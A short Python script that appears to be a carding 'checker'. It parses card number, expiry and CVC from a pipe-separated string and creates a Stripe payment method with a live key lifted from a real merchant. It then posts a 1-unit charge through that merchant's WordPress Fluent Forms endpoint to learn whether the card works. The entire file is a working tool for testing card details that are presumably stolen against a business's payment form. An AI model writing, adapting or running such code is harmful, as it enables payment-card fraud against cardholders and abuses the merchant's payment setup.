import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51IXwkqBLMl4vDdARZ3xL9t7MH0fOaDgZtKyBmtzWHjNb76PTehVoZyOSo8kp9EjWbtex8ZnZ9hTpE4VLgXVRQuOK0096dNSDkU'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
	    '_ga': 'GA1.1.1935729557.1724265484',
	    '__stripe_mid': '072265e3-cdab-4ed9-aedd-202c91291d796c6700',
	    '_ga_SVT6D958DP': 'GS1.1.1725037438.12.0.1725037438.0.0.0',
	    '__stripe_sid': '56733d4a-2c10-437b-a93d-e4c5d7a4cd86ac0d06',
	}
	
	headers = {
	    'authority': 'myclearview.uk',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.1935729557.1724265484; __stripe_mid=072265e3-cdab-4ed9-aedd-202c91291d796c6700; _ga_SVT6D958DP=GS1.1.1725037438.12.0.1725037438.0.0.0; __stripe_sid=56733d4a-2c10-437b-a93d-e4c5d7a4cd86ac0d06',
	    'origin': 'https://myclearview.uk',
	    'pragma': 'no-cache',
	    'referer': 'https://myclearview.uk/payments/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1725037477894',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=3652&_fluentform_3_fluentformnonce=8def0b7b86&_wp_http_referer=%2Fpayments%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=&phone=&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bzip%5D=&dropdown=Other&description=&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	r2 = requests.post(
	    'https://myclearview.uk/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	return (r2.json())